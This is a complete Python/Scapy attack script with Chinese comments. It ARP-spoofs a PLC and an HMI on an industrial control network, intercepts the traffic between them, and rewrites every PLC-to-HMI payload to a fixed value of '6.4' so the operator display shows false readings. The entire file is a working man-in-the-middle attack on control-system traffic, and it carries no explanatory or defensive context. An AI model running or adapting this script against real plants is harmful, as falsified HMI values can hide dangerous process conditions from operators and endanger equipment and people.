from scapy.all import *
import threading
import time

plc_mac = "e0:dc:a0:36:c0:7e"
plc_ip = "192.168.1.3"
hmi_mac = "e0:dc:a0:30:49:fa"
hmi_ip = "192.168.1.4"
local_mac = "08:26:ae:33:ef:ba"
local_ip = "192.168.1.99"

# 构建ARP欺骗数据包
packet_1 = ARP(psrc=plc_ip, hwsrc=local_mac, pdst=hmi_ip, hwdst=hmi_mac)
packet_2 = ARP(psrc=hmi_ip, hwsrc=local_mac, pdst=plc_ip, hwdst=plc_mac)

# 双向ARP欺骗
def arp_attack():
    while True:
        send(packet_1, verbose=0)
        send(packet_2, verbose=0)
        time.sleep(3)

# 捕获和转发数据包
def forward_packet(packet):
    # PLC发给HMI
    if packet[Ether].src == plc_mac and packet[Ether].dst == local_mac:
        # 修改数据包，将HMI的显示值固定为6.4
        packet[Raw].load = b'6.4'
        packet[Ether].dst = hmi_mac
        sendp(packet, verbose=0)

    # 从HMI发给PLC，直接转发
    elif packet[Ether].src == hmi_mac and packet[Ether].dst == local_mac:
        packet[Ether].dst = plc_mac
        sendp(packet, verbose=0)

# 监听网络数据包
def sniff_packets():
    sniff(filter=f"ip host {plc_ip} or ip host {hmi_ip}", 
          prn=forward_packet,
          store=0)

# 主函数
def main():
    # 启动ARP欺骗线程
    arp_thread = threading.Thread(target=arp_attack)
    arp_thread.daemon = True
    arp_thread.start()

    # 启动数据包监听线程
    sniff_thread = threading.Thread(target=sniff_packets)
    sniff_thread.daemon = True
    sniff_thread.start()

    # 保持主程序运行
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("停止攻击")

if __name__ == "__main__":
    main()